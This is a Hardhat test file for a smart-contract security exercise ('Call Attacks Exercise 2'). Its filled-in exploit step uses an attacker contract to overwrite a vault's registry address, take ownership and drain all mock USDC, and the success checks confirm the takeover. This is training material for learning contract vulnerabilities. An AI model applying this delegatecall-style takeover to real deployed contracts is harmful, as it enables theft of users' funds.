const { expect } = require("chai");
const { ethers } = require("hardhat");

describe('Call Attacks Exercise 2', function () {
  let deployer, attacker, secureStore, registryLibrary, usdc;

  before(async () => {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [deployer, attacker] = await ethers.getSigners();

    const RegistryLibrary = await ethers.getContractFactory('RegistryLibrary');
    registryLibrary = await RegistryLibrary.connect(deployer).deploy();

    const USDC = await ethers.getContractFactory("USDC");
    usdc = await USDC.connect(deployer).deploy();

    const SecureStore = await ethers.getContractFactory('SecureStore');

    secureStore = await SecureStore.connect(deployer).deploy(registryLibrary.address, 500000, usdc.address);

    // Setting up the attacker
    await usdc.connect(deployer).mint(attacker.address, ethers.utils.parseEther('10000'));

    // Setting up the SecureStore
    await usdc.connect(deployer).mint(secureStore.address, ethers.utils.parseEther('10000000'));

  });

  it('Exploit', async () => {
    /** CODE YOUR SOLUTION HERE */
    const AttackerContract = await ethers.getContractFactory('Attacker');
    const attackerContract = await AttackerContract.connect(attacker).deploy(usdc.address);

    // USDC to attackerContract
    await usdc.connect(attacker).transfer(attackerContract.address, ethers.utils.parseEther('10000'));

    // Change the address of the registry in SecureStore
    await attackerContract.connect(attacker).changeRegistryAddress(secureStore.address);
    
    // Advance the block timestamp by 1 day
    await network.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]);

    // Change the owner of the SecureStore to the attacker's address
    await attackerContract.connect(attacker).changeOwner(secureStore.address);
    
    // Withdraw all the funds from the SecureStore
    await secureStore.connect(attacker).withdrawAll();
  });

  after(async () => {
    /** SUCCESS CONDITIONS */

    expect(await secureStore.owner()).to.eq(attacker.address);
    const balanceSecureStore = await usdc.balanceOf(secureStore.address);
    expect(balanceSecureStore).to.eq(0);
  });
});